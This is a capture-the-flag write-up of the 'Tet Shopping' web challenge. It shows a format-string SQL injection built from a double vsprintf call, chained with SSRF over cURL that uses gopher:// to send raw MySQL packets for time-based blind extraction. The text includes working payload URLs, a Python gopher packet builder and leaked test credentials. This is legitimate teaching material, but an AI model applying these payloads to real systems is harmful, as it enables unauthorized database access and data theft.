## Tet Shopping

### Description
```
Tet shopping (996)

Tet is coming, let 's go shopping

Service: http://128.199.179.156/
Source: http://128.199.179.156/src.tar.gz
```

### Topics and Tools
- SQLi
- Blind SQLi
- Wireshark
- SSRF
- Gopher

### The Challenge

Tet Shopping is an online web store for buying supplies to prepare for Tet
(Vietnamese New Year). This ended up being a very interesting challenge with multiple parts to it. Because there's so much, this writeup is a bit long, sorry!

 The web app features a very barebones shopping cart and item purchase tracking system. After poking around the web app a bit and not finding anything obvious, I dove into the provided source.

NOTE: The source was "updated" about 10 hours into the CTF. `cfg.php` and `info.php` were both changed. I will point out the changes when I get to them and point out why I think both of the changes should have been left out.

To begin with, some very interesting things are immediately noticeable:

 There is a file called `backup.sh` that contains:
 ```#!/bin/sh
echo "[+] Creating flag user and flag table."
mysql -h 127.0.0.1 -uroot -p <<'SQL'
CREATE DATABASE IF NOT EXISTS `flag` /*!40100 DEFAULT CHARACTER SET utf8 */;
USE `flag`;
DROP TABLE IF EXISTS `flag`;
CREATE TABLE `flag` (
  `flag` VARCHAR(1000)
);
CREATE USER 'fl4g_m4n4g3r'@'localhost';
GRANT USAGE ON *.* TO 'fl4g_m4n4g3r'@'localhost';
GRANT SELECT ON `flag`.* TO 'fl4g_m4n4g3r'@'localhost';
SQL

echo -n "[+] Please input the flag:"
read flag

mysql -h 127.0.0.1 -uroot -p <<SQL
INSERT INTO flag.flag VALUES ('$flag');
SQL

echo "[+] backup successful"
```

So we know we'll have to access the database somehow to get our flag. This immediately reminded me the extract0r challenge from 34C3 CTF. This challenge ends up being rather similar to it in the end.
(I highly recommend reading eboda's [WRITEUP](https://github.com/eboda/34c3ctf/tree/master/extract0r)).

Also easily discovered is the `cfg.php` which contains all of the code for interfacing with the database. When the challenge first launched, `cfg.php` contained:
```
private $db_server = "localhost";
private $db_user = "VN_tet";
private $db_pass = '123qwe!@#QWE';
private $db_database = "VN_tet";
```

So we now know that the web app is using a different database than the flag is stored in (VN_tet vs flag). For some reason, the source got updated and the newer version of `cfg.php` now shows:
```
private $db_server = "localhost";
private $db_user = "xxxx";
private $db_pass = 'xxxx';
private $db_database = "xxxx";
```

I'm not quite sure what the logic behind changing this was... Why would you ever give _less_ information in an update?

After some more source reading, I found some fun stuff in `func.php`:

```
function get_data($url) {
	$ch = curl_init();
	$timeout = 2;
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	$data = curl_exec($ch);
	curl_close($ch);
	return $data;
}
```

Looks like a potential SSRF! (*cough* extract0r *cough*)

So stepping backwards to figure out how to control this function, more source code digging!
get_data() is called from the watermark_me() function in `func.php`.
watermark_me is a function that applies their "Pepe Verified!" image on top of store items when viewing them at `/info.php`.
 The only parts of watermark_me that matter for what we need are:

```
function watermark_me($img){
	if(preg_match('/^file/', $img)){
		die("Ahihi");
	}
	$file_content = get_data($img);
	$fname = 'tmp-img-'.rand(0,9).'.tmp';
	@file_put_contents('/tmp/'.$fname, $file_content);
	while(1){
	if(file_exists('/tmp/'.$fname))
		break;
	}
  ...
```
If we can pass an `$img` into watermark_me, SSRF!

NOTE: I'm going to get this out of the way here. I spent a _lot_ of time trying to get RCE via imagePng and other PHP GD vulnerabilities in the watermark_me() function. If anyone was able to get this to work, please let me know how!

Moving backwards again, watermark_me() is only called from one place which is in `info.php`:

```
...

$uid = (int)$_SESSION["id"];
$prepare_qr = $jdb->addParameter("SELECT user from users where uid=%s", $uid);
$result1 = $jdb->fetch_assoc($prepare_qr);
$username = $result1[0]['user'];
$prepare_qr = $jdb->addParameter("SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=%s",  $_GET['uid']);
$prepare_qr = $jdb->addParameter($prepare_qr.' and user=%s', $username);

$result = $jdb->fetch_assoc($prepare_qr);

if(count($result)<=0)
	die("Not yet!");

...

echo '<img height="300px" weight="300px" src="data:image/png;base64,'.watermark_me('http://127.0.0.1'.$result[0]['img']).'"><br>';
```

NOTE: This is the second major source update. Above is the updated version. The original version was:

```
echo '<img height="300px" weight="300px" src="data:image/png;base64,'.watermark_me($result[0]['img']).'"><br>';
```
This update REALLY frustrates me because I can tell you with 100% certainty, the original is how their live version is actually running.
And that matters. A lot.


If we can control what the "img" column returns for $result, we can start doing some fun SSRF things. This means SQLi. So let's see what that `addParameter` is doing exactly:

```	function addParameter($qr, $args){
		if(is_null($qr)){
			return;
		}
		if(strpos($qr, '%') === false ) {
			return;
		}
		$args = func_get_args();
		array_shift($args);
		if(is_array($args[0]) && count($args)==1){
			$args = $args[0];
		}
		foreach($args as $arg){
			if(!is_scalar($arg) && !is_null($arg)){

				return;
			}
		}
		$qr = str_replace( "'%s'", '%s', $qr);
		$qr = str_replace( '"%s"', '%s', $qr);
		$qr = preg_replace( '|(?<!%)%f|' , '%F', $qr);
		$qr = preg_replace( '|(?<!%)%s|', "'%s'", $qr);

		array_walk($args, array( $this, 'ebr' ) );
		return @vsprintf($qr, $args);
	}

  function ebr(&$st ) {
		if (!is_float($st))
			$st = $this->_re($st);
	}
	function _re($st) {
		if ($this->conn) {
			return mysqli_real_escape_string($this->conn, $st);
		}

		return addslashes($st);
	}
```
This function is doing some pretty normal and expected steps when dealing with prepared queries.
It's making sure there's at least one variable item (marked with `%`), making sure there's some variables to fill in, and sending all variables through a `mysqli_real_escape_string()`.
It's also adding single quotes around the %s that are located in the query.
The final step is the most interesting though:
```
return @vsprintf($qr, $args);
```

On its own, vsprintf isn't always bad, but format strings are often a good place to get some kind of injection.
vsprintf differs from sprintf in taking an array of arguments instead of multiple parameters.

Quick example of what php's vsprintf does:
```
$data = array("World");
$x =  vsprintf("Hello %s", $data);
echo $x;

// out
// Hello World!
```

Note: Around this point is where I stood up my own local instance of the web application. I made a database to match it (easy since they give you the `db.sql`), made a flag DB, and was up and running with a test environment. This allowed me to easily debug injections to see if my queries were anywhere near being valid.

To get our goal of controlling "img", there's really only one potential SQL injection point:
```
$prepare_qr = $jdb->addParameter("SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=%s",  $_GET['uid']);
$prepare_qr = $jdb->addParameter($prepare_qr.' and user=%s', $username);
$result = $jdb->fetch_assoc($prepare_qr);
```

Some basic testing on my local instance verified that variables were in fact getting escaped correctly.
Ex:
```
?uid=5' or '1' = '1
QUERY: SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid='5\' or \'1\' = \'1' and user='reznok'
```

So it was time to get creative. The vulnerability here is that the statement is being prepared twice. This means it's going through `vsprintf` twice, which means we can do some interesting replacements.
Any `%s` that makes it through the first prepare will be handled by the second prepare.

Example:
```
$_GET['uid'] = '%s';
$prepare_qr = $jdb->addParameter("SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=%s",  $_GET['uid']);
echo $prepare_qr

// out
// SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid=%s


$prepare_qr = $jdb->addParameter($prepare_qr.' and user=%s', $username);
// out
// ERROR!
```
The second prepare fails here, because it's trying to replace two `%s` in the string and it only has one variable to do so. I was stuck on this for a while: The number of supplied arguments to `vsprintf` must match the number of variables in the format string.
_or so I thought!_

Not all too surprisingly, it turns out there's a strange syntax to use positional arguments in format strings. This allows you to put one variable into multiple spots.
The syntax is: `%i$s` (Where i is the index of the argument, and s is the type of variable, which in this case is string).
Example:

```
$data = array("World", "Mars");
echo vsprintf("Hello %s! Hello %s!", $data);
// out: Hello World! Hello Mars!

echo vsprintf("Hello %1\$s! Hello %1\$s!", $data);
// out: Hello World! Hello World!
```

So we replace our previous payload of `$_GET['uid']='%s'` with `$_GET['uid']='%1$s'` and get:

```
...
$prepare_qr = $jdb->addParameter($prepare_qr.' and user=%s', $username);
echo $prepare_qr;

// out
// SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid='reznok' and user='reznok'
```

Okay so we can put our username into both the gid and user fields. The first thing I tried here was making a user named `'or '1' = '1'`, but that gets escaped when a user is inserted.
Fortunately, the `%c` exists with format strings! %c takes an int input (or a string that's treated as an int) and gets the ASCII equivalent. Which means we can put in a number (Which doesn't get escaped by mysqli_real_escape_string), and get any ASCII character we want, including single quotes!

One small issue though, if we're using the username as a variable, we're going to need to get a new name. So I created an account with the username `39` which translates to an ASCII value of single quote. (Password on live server is `39` as well if you want to try it out).

NOTE: 39 followed by any string I _believe_ would work as well. So `39 cats` should get the same results.

This gives us the payload of:

http://128.199.179.156/info.php?uid=test%1$c%20or%20%1$c1%1$c=%1$c1
(each %1$c is a single quote because of our username of `39`)

Which results in the query:
`SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid='test' or '1'='1' and user='39'`

SQLi! Just replace all single quotes with `%1$c1` and do all SQLi as normal since there's no other protections / filtering.

Now controlling the "img" result is trivial:
End Query:
`USE VN_tet; SELECT goods.name, goods.description, goods.img from goods inner join info on goods.uid=info.gid where gid='test' UNION SELECT 'my_name', 'my_desc', "IMG FIELD!"; #' and user='39'`
Result:
```
name        | description  | img
"my_name"   | "my_desc"    | "IMG FIELD!"
```
Payload: http://128.199.179.156/info.php?uid=test%1$c%20%20UNION%20SELECT%20%1$cmy_name%1$c,%1$cmy_desc%1$c,%20%1$cIMG%20FIELD!%1$c;%20%23

I tested this to see if I could load images from remote locations, and I could: I set img to http://<my_vps>/cat.jpg and huzzah!

![RemoteImage](https://github.com/reznok/CTFWriteUps/blob/master/AceBear_2018/TetShopping/screenshots/remoteimage.png?raw=true)

This goes back to what I mentioned earlier about how the update to `info.php` is incorrect. There is no `http://127.0.0.1/` prepended to requests, and if there was, it would make my next step impossible!

From here, the challenge becomes very similar to extract0r. I used that writeup and [this writeup](https://mp.weixin.qq.com/s/9vk-H36erencugdYca9qXA) of another similar challenge to get me through the SSRF part.

Because the web app is using cURL, we can use gopher:// to communicate with the MySQL database. gopher:// doesn't know anything about MySQL, but it knows how to send bytes. If you send the right bytes to a MySQL server, you get information, just like any other service! The trick is discovering which bytes to send.

Here is a screenshot of what the traffic looks like when connect to a MySQL database using the mysql cli client:

![Wireshark](https://github.com/reznok/CTFWriteUps/blob/master/AceBear_2018/TetShopping/screenshots/wireshark.png?raw=true)

We can filter this to only look at the bytes that we sent to the server:

![Wireshark2](https://github.com/reznok/CTFWriteUps/blob/master/AceBear_2018/TetShopping/screenshots/wireshark2.png?raw=true)

NOTE: I highly recommend reading the write-ups linked above before continuing. The one in Chinese is worth translating as the rest is copied almost step by step from there.

The first packets are the authentication packets, folowed by the query request, and finished with a QUIT request.

So now we know how to speak bytes to MySQL. Let's try doing that with gopher. Thanks to the other writeups, I had this function:

```
def encode(s):
    a = [s[i:i + 2] for i in range(0, len(s), 2)]
    return "gopher://127.0.0.1:3306/_%" + "%".join(a)
```

This allowed me to copy paste the bytes from wireshark, run them as a string through this function, and get a curl gopher command. (Try it, it works!)
Unfortunately, gopher isn't great at reading the returned data, but you run any query you want including ones that contain SLEEP(). From here it's pretty standard time-based blind SQLi injection with the caveat of having to convert everything to be gopher friendly. This is easily done with python.

```
auth = """aa00000185a6ff0100000001210000000000000000000000000000000000000000000000666c34675f6d346e3467337200006d7973716c5f6e61746976655f70617373776f72640065035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f70696404363439390f5f636c69656e745f76657273696f6e06352e372e3231095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c
210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031""".replace("\n", "")


def encode(s):
    a = [s[i:i + 2] for i in range(0, len(s), 2)]
    return "gopher://127.0.0.1:3306/_%" + "%".join(a)


def get_payload(query):
    query = query.encode().hex()
    query_length = '{:x}'.format((int((len(query) / 2) + 1)))
    pay1 = query_length + "00000003" + query
    final = encode(auth + pay1 + "0100000001")
    return final




query = 'select * from flag.flag where (flag LIKE binary "A%" AND sleep(5));'
```

This snippet shows how to get the gopher:// version of any query. There was a lot of tweaking and some manual work of figuring out how to construct the packets, but those steps are detailed in the other write-ups.

Running the output of this script against my local web app proved that time-based blind SQLi was possible as I had a fake flag in my flag database called `ACEBEAR{A_flag_HaS_You}`.
With a query like above, it took 5 seconds to return. If I were to change the hardcoded `A` in the query to a `B`, it would return instantly (as it would not hit the SLEEP function).

So after putting _everything_ together, I ended up with an exploit script.
NOTE: The % signs need to be double encoded when going through Tet Shop, so `final = encode(auth + pay1 + "0100000001")` is changed to `final = encode(auth + pay1 + "0100000001").replace("%", "%%25")`

![Exploit](https://github.com/reznok/CTFWriteUps/blob/master/AceBear_2018/TetShopping/screenshots/exploit.png?raw=true)

This ends up giving a URL instead of an actual flag of:
https://tinyurl.com/y9pplum3

Which is an image with the flag on it:

![Flag](screenshots/flag.jpg)
